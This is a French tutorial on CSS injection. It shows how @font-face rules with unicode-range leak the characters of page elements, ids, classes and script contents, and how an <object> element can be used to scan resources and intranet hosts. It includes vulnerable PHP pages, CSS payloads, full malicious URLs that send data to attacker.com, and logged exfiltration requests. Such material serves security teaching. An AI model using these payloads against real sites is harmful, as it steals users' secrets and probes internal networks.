---
description: 20 Novembre 2022
---

# Les injections CSS - Règle @font-face et descripteur unicode

> Dans cet article, l'exploitation de l'injection CSS ne va plus cibler le contenu des attributs HTML, mais le contenu des éléments HTML, avec certaines limitations toutefois.

## Utilisation de la règle @font-face et du descripteur unicode

L'inconvénient de la méthode précédente est qu'elle ne permet pas de récupérer le contenu d'un élément HTML, mais seulement la valeur d'un attribut. L'utilisation de la règle `@font-face` peut permettre de contourner cette limitation.&#x20;

### Récupération d'information en fonction de l'élément HTML

Le code vulnérable suivant possède un élément HTML `<span></span>` ayant comme contenu une information sensible propre au visiteur :&#x20;

{% code overflow="wrap" lineNumbers="true" %}
```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <style>
     h1 {
        color: <?php echo htmlspecialchars($_GET['color'], ENT_QUOTES | ENT_SUBSTITUTE | ENT_HTML5, "UTF-8") ?>;
      }
  </style>
  </head>
  <body>
    <h1>Injection CSS - récupération de la valeur d'un élément HTML via @font-face et descripteur unicode</h1>
    <span>s3cr3t</span>
  </body>
</html>
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>

L'attaquant souhaite évidemment récupérer le contenu de l'élément `<span></span>` qui contient ce secret. Pour cela, il va utiliser la règle `@font-face` ainsi qu'un code unicode grâce au descripteur `unicode-range` représentant le caractère à tester. Il faudra également spécifier une URL distante permettant de récupérer le caractère identifié ainsi qu'une police d'écriture permettant de l'appliquer sur l'élément HTML ciblé :

{% code overflow="wrap" lineNumbers="true" %}
```html
<style>
  @font-face {
    // Nom de la police d'écriture (arbitraire)
    font-family: attack;
    
    // URL du serveur de l'attaquant
    // Permet de savoir quel caractère a été récupéré
    src: url(https://attacker.com/?leak=a); 
    
    // Test de la présence du caractère spécifié en unicode
    unicode-range: U+0061;
  }
  
  // Element HTML ciblé par l'attaque
  span {
    // Applique la police d'écriture
    font-family: attack;
  }
</style>
```
{% endcode %}

Par exemple, si l'attaquant tente de savoir si le secret contient le caractère "s", le lien à fournir à la victime est le suivant :&#x20;

{% code overflow="wrap" %}
```
https://vulnerable.com/font-face-et-descripteur-unicode.php?color=red;}@font-face{font-family:attack;src:url(https://attacker.com/?leak=s);unicode-range:U%2b0073}span{font-family:attack;}
```
{% endcode %}

{% hint style="warning" %}
Attention à bien encoder le caractère "+" par son équivalent URL encodée "%2b".
{% endhint %}

{% code overflow="wrap" %}
```http
GET /?leak=s HTTP/1.1
Host: attacker.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
Referer: https://vulnerable.com
Connection: close
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (8) (2).png" alt=""><figcaption></figcaption></figure>

Il y a donc bien un "s" dans le secret de la victime. L'attaquant peut ainsi continuer d'exfiltrer les autres caractères présents dans le secret :&#x20;

{% code overflow="wrap" %}
```
https://vulnerable.com/font-face-et-descripteur-unicode.php?color=red;}@font-face{font-family:attack;src:url(https://attacker.com/?leak=3);unicode-range:U%2b0033;}span{font-family:attack;}
```
{% endcode %}

{% code overflow="wrap" %}
```http
GET /?leak=3 HTTP/1.1
Host: attacker.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
Referer: https://vulnerable.com
Connection: close
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (8) (4).png" alt=""><figcaption></figcaption></figure>

Malheureusement, cette technique possède plusieurs limitations : il n'est pas possible de connaitre les caractères dupliqués (plusieurs caractères "3" dans l'exemple ci-dessus) ni l'ordre d'apparition de ces caractères.

### Récupération en fonction de l'id

Dans l'exemple précédent, tous les éléments `<span></span>` seront analysés, il sera difficile pour l'attaquant d'identifier quel caractère provient de quel élément de la page vulnérable. Pour contourner cela, il est possible de cibler un attribut `id` :&#x20;

{% code overflow="wrap" lineNumbers="true" %}
```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <style>
     h1 {
        color: <?php echo htmlspecialchars($_GET['color'], ENT_QUOTES | ENT_SUBSTITUTE | ENT_HTML5, "UTF-8") ?>;
      }
  </style>
  </head>
  <body>
    <h1>Injection CSS - récupération de la valeur d'un élément HTML par son id via @font-face et descripteur unicode</h1>
    <span id="secret">s3cr3t</span>
  </body>
</html>
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

En CSS le caractère `#` va permettre de sélectionner un attribut `id` spécifique :

{% code overflow="wrap" lineNumbers="true" %}
```html
<style>
  @font-face {
    // Nom de la police d'écriture (arbitraire)
    font-family: attack;
    
    // URL du serveur de l'attaquant
    // Permet de savoir quel caractère a été récupéré
    src: url(https://attacker.com/?leak=a); 
    
    // Test de la présence du caractère spécifié en unicode
    unicode-range: U+0061;
  }
  
  // Id ciblé par l'attaque
  #secret {
    // Applique la police d'écriture
    font-family: attack;
  }
</style>
```
{% endcode %}

Le lien malicieux permettant l'exploitation en fonction de la valeur de l'attribut `id` est alors le suivant :

{% code overflow="wrap" %}
```
https://vulnerable.com/font-face-et-descripteur-unicode-par-id.php?color=red;}@font-face{font-family:attack;src:url(https://attacker.com/?leak=s);unicode-range:U%2b0073;}%23secret{font-family:attack;}
```
{% endcode %}

{% hint style="warning" %}
Attention à bien encoder les caractères "+" et "#" par leur équivalent URL encodée, respectivement "%2b" et %23".
{% endhint %}

{% code overflow="wrap" %}
```http
GET /?leak=s HTTP/1.1
Host: attacker.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
Referer: https://vulnerable.com
Connection: close
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

### Récupération en fonction de la classe

De la même façon, il est possible de cibler un attribut `class` au lieu d'un attribut `id` :&#x20;

{% code overflow="wrap" lineNumbers="true" %}
```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <style>
     h1 {
        color: <?php echo htmlspecialchars($_GET['color'], ENT_QUOTES | ENT_SUBSTITUTE | ENT_HTML5, "UTF-8") ?>;
      }
  </style>
  </head>
  <body>
    <h1>Injection CSS - récupération de la valeur d'un élément HTML par sa class via @font-face et descripteur unicode</h1>
    <span class="secret">s3cr3t</span>
  </body>
</html>
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ici, c'est le caractère `.` qui va permettre de sélectionner l'attribut `class` désiré :

{% code overflow="wrap" lineNumbers="true" %}
```html
<style>
  @font-face {
    // Nom de la police d'écriture (arbitraire)
    font-family: attack;
    
    // URL du serveur de l'attaquant
    // Permet de savoir quel caractère a été récupéré
    src: url(https://attacker.com/?leak=a); 
    
    // Test de la présence du caractère spécifié en unicode
    unicode-range: U+0061;
  }
  
  // Class ciblée par l'attaque
  .secret {
    // Applique la police d'écriture
    font-family: attack;
  }
</style>
```
{% endcode %}

Le lien malicieux permettant l'exploitation en fonction de la valeur de l'attribut `class` est alors le suivant :

{% code overflow="wrap" %}
```
https://vulnerable.com/font-face-et-descripteur-unicode-par-class.php?color=red;}@font-face{font-family:attack;src:url(https://attacker.com/?leak=s);unicode-range:U%2b0073;}.secret{font-family:attack;}
```
{% endcode %}

{% hint style="warning" %}
Attention à bien encoder le caractère "+" par son équivalent URL encodée "%2b".
{% endhint %}

{% code overflow="wrap" %}
```http
GET /?leak=s HTTP/1.1
Host: attacker.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
Referer: https://vulnerable.com
Connection: close
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

Dans le cas où il existe plusieurs éléments HTML portant le nom de `class`, il est possible de cibler précisément celle désirée en utilisant la pseudo-classe CSS `nth-child(n)` ([https://developer.mozilla.org/fr/docs/Web/CSS/:nth-child](https://developer.mozilla.org/fr/docs/Web/CSS/:nth-child)) :&#x20;

{% code overflow="wrap" lineNumbers="true" %}
```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <style>
     h1 {
        color: <?php echo htmlspecialchars($_GET['color'], ENT_QUOTES | ENT_SUBSTITUTE | ENT_HTML5, "UTF-8") ?>;
      }
  </style>
  </head>
  <body>
    <h1>Injection CSS - récupération de la valeur d'un élément HTML par sa class via @font-face, descripteur unicode et nth-child()</h1>
    <span class="secret">notImportant</span>
    <span class="secret">s3cr3t</span>
  </body>
</html>
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>

L'ajout de la pseudo-class `nth-child()` va permettre de sélectionner seulement le second élément HTML ayant l'attribut class désiré :

{% code overflow="wrap" lineNumbers="true" %}
```html
<style>
  @font-face {
    // Nom de la police d'écriture (arbitraire)
    font-family: attack;
    
    // URL du serveur de l'attaquant
    // Permet de savoir quel caractère a été récupéré
    src: url(https://attacker.com/?leak=a); 
    
    // Test de la présence du caractère spécifié en unicode
    unicode-range: U+0061;
  }
  
  // S'applique pour le troisième fils et ayant la Class ciblée par l'attaque
  .secret:nth-child(3) {
    // Applique la police d'écriture
    font-family: attack;
  }
</style>
```
{% endcode %}

Le lien malicieux permettant l'exploitation en fonction de la valeur de l'attribut `class` ainsi que de la position de l'élément ciblé est alors le suivant :

{% code overflow="wrap" %}
```
https://vulnerable.com/font-face-et-descripteur-unicode-par-class-via-nth-child.php?color=red;}@font-face{font-family:attack;src:url(https://attacker.com/?leak=s);unicode-range:U%2b0073;}.secret:nth-child(3){font-family:attack;}
```
{% endcode %}

{% hint style="warning" %}
Attention à bien encoder le caractère "+" par son équivalent URL encodée "%2b".
{% endhint %}

{% code overflow="wrap" %}
```http
GET /?leak=s HTTP/1.1
Host: attacker.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
Referer: https://vulnerable.com
Connection: close
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (5) (4).png" alt=""><figcaption></figcaption></figure>

### Récupération du contenu d'une balise \<script>\</script>

En temps normal, il n'est pas possible de récupérer de l'information contenue dans une balise `<script></script>`:&#x20;

{% code overflow="wrap" lineNumbers="true" %}
```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <style>
     h1 {
        color: <?php echo htmlspecialchars($_GET['color'], ENT_QUOTES | ENT_SUBSTITUTE | ENT_HTML5, "UTF-8") ?>;
      }
  </style>
  </head>
  <body>
    <h1>Injection CSS - récupération de la valeur d'un élément HTML &#x3c;script&#x3e; via @font-face et descripteur unicode</h1>
    <script>
        var key = "s3cr3t";
    </script>
  </body>
</html>
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (1) (4) (1).png" alt=""><figcaption></figcaption></figure>

La raison est que le texte contenu dans ces balises n'est pas affiché et ne déclenche jamais les règles de style utilisées par l'attaque.&#x20;

Pour contourner cela, il est possible d'ajouter l'instruction CSS diplay:block au niveau des balises de script :&#x20;

{% code overflow="wrap" lineNumbers="true" %}
```css
script {
  display: block;
}
```
{% endcode %}

Cela a pour effet de faire apparaitre le contenu de la balise et ainsi déclencher la règle CSS `@font-face` (la victime pourra également voir le contenu pendant l'exploitation) :&#x20;

<figure><img src="../../../.gitbook/assets/image (10) (4).png" alt=""><figcaption></figcaption></figure>

Le code CSS complet est le suivant :&#x20;

```html
<style>
  @font-face {
    // Nom de la police d'écriture (arbitraire)
    font-family: attack;
    
    // URL du serveur de l'attaquant
    // Permet de savoir quel caractère a été récupéré
    src: url(https://attacker.com/?leak=a); 
    
    // Test de la présence du caractère spécifié en unicode
    unicode-range: U+0061;
  }
  
  // S'applique pour les balises script
  script {
    // Permet d'afficher son contenu
    diplay:block;
    // Applique la police d'écriture
    font-family: attack;
  }
</style>
```

Le lien malicieux permettant l'exploitation avec la nouvelle instruction CSS devient :&#x20;

<pre data-overflow="wrap"><code><strong>https://vulnerable.com/font-face-et-descripteur-unicode-script.php?color=red;}@font-face{font-family:attack;src:url(https://attacker.com/?leak=s);unicode-range:U%2b0073;}script{display:block;font-family:attack;}
</strong></code></pre>

{% hint style="warning" %}
Attention à bien encoder le caractère "+" par son équivalent URL encodée "%2b".
{% endhint %}

{% code overflow="wrap" %}
```http
GET /?leak=s HTTP/1.1
Host: attacker.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
Referer: https://vulnerable.com
Connection: close
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (4) (2) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Bien sur, ici l'attaquant va également récupérer les caractères composants les mots clés de Javascript, par exemple "var" ici.
{% endhint %}

### Automatisation de l'attaque

L'attaque étant limitée (il est seulement  possible de savoir si un caractère est présent ou non) l'exploitation par injection d'iframe effectuée pour les sélecteurs CSS n'est pas obligatoire. Afin de déterminer la présence de caractères alphanumériques (non sensibles à la casse) le partage d'un seul lien malicieux peut être suffisant.

Exemple de 5 requêtes représentant l'information "s3cr3t" récupérée :

<figure><img src="../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

Un PoC minimaliste est disponible [ici](https://github.com/Sharpforce/PoC-CSS-injection/tree/master/font-face-and-unicode-descriptor).

### Scanner des services et des ressources

Si l'attaquant est également en mesure de contrôler un élément HTML tel qu'un `<object></object>`, il devient alors possible de scanner des services réseaux ainsi que des ressources HTTP. Le code vulnérable utilisé dans les prochains exemples est le suivant :&#x20;

{% code overflow="wrap" lineNumbers="true" %}
```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <style>
        h1 {
            color: <?php echo htmlspecialchars($_GET['color'], ENT_QUOTES | ENT_SUBSTITUTE | ENT_HTML5, "UTF-8") ?>;
        }
    </style>
  </head>
  <body>
    <h1>Injection CSS - Scanner des ressources via @font-face</h1>
    <object id="attacker" data="<?php echo htmlspecialchars($_GET['url'], ENT_QUOTES | ENT_SUBSTITUTE | ENT_HTML5, 'UTF-8') ?>">Error</object>
  </body>
</html>
```
{% endcode %}

L'élément HTML `<object></object>` va afficher le contenu récupéré en requêtant l'URL de l'attribut `data`:

<figure><img src="../../../.gitbook/assets/image (13) (2).png" alt=""><figcaption></figcaption></figure>

Si aucune information n'est récupérée (hôte non joignable, ressource non trouvée, etc) le texte alternatif `Error` sera alors affiché à l'utilisateur :&#x20;

<figure><img src="../../../.gitbook/assets/image (2) (5).png" alt=""><figcaption></figcaption></figure>

En analysant le site vulnérable, l'attaquant identifie un endpoint contenant l'identifiant de l'utilisateur actuel : `http://vulnerable.com/users.php?id={id}`. Pour l'attaquant, l'URL est  `http://vulnerable.com/users.php?id=967344`. Afin d'exploiter une seconde vulnérabilité plus sévère, il souhaite connaitre l'identifiant de sa victime.

Pour cela, il va tout d'abord exploiter l'injection CSS et utiliser l'élément HTML `<object></object>`. Le style à appliquer sera le suivant :

{% code overflow="wrap" lineNumbers="true" %}
```html
<style>
  @font-face {
    // Nom de la police d'écriture (arbitraire)
    font-family: attack;
    
    // URL du serveur de l'attaquant
    // Indique quels résolutions d'hôtes de ou ports se terminent en erreur
    src: url(https://attacker.com/?leak=1); 
    
    // Test de la présence du caractère spécifié en unicode
    // L'unicode doit être un caractère présent dans le texte alternatif, ici "E"
    unicode-range: U+0045;
  }
  
  // S'applique sur l'élément <object> que contrôle l'attaquant
  #attacker {
    // Applique la police d'écriture
    font-family: attack;
  }
</style>
```
{% endcode %}

La première tentative va être l'identifiant `1`. Si ce n'est pas celui de la victime alors l'attaquant recevra une requête en retour. Le lien malicieux à envoyer à la victime pour cette attaque est le suivant :&#x20;

{% code overflow="wrap" %}
```
https://vulnerable.com/font-face-et-descripteur-unicode-scanner-de-ressources.php?color=red;}@font-face{font-family:attack;src:url(https://attacker.com/?leak=1);unicode-range:U%2b0045;}%23attacker{font-family:attack;}&url=https://vulnerable.com/users.php?id=1
```
{% endcode %}

{% hint style="warning" %}
Attention à bien encoder les caractères "+" et "#" par leur équivalent URL encodée, respectivement "%2b" et %23".
{% endhint %}

{% code overflow="wrap" %}
```http
GET /?leak=1 HTTP/1.1
Host: attacker.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
Referer: https://vulnerable.com
Connection: close
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

Il faut donc continuer l'attaque jusqu'à deviner l'identifiant et qu'aucune requête ne soit reçue par l'attaquant.

Cette technique rend également possible de scanner des hôtes (adresse IP ou nom de domaine) pouvant répondre à une requête HTTP. Ici, l'attaquant souhaite par exemple savoir si un serveur HTTP est accessible sur l'intranet de la victime :&#x20;

{% code overflow="wrap" %}
```
https://vulnerable.com/font-face-et-descripteur-unicode-scanner-de-ressources.php?color=red;}@font-face{font-family:attack;src:url(https://attacker.com/?leak=1);unicode-range:U%2b0045;}%23attacker{font-family:attack;}&url=https://internal.vulnerable.com/
```
{% endcode %}

Si tel est bien le cas, l'attaquant ne recevra pas de requête déclenchée par l'application du style CSS.

## Références

* [https://book.hacktricks.xyz/pentesting-web/xs-search/css-injection](https://book.hacktricks.xyz/pentesting-web/xs-search/css-injection)
* [https://x-c3ll.github.io/posts/CSS-Injection-Primitives/](https://x-c3ll.github.io/posts/CSS-Injection-Primitives/)
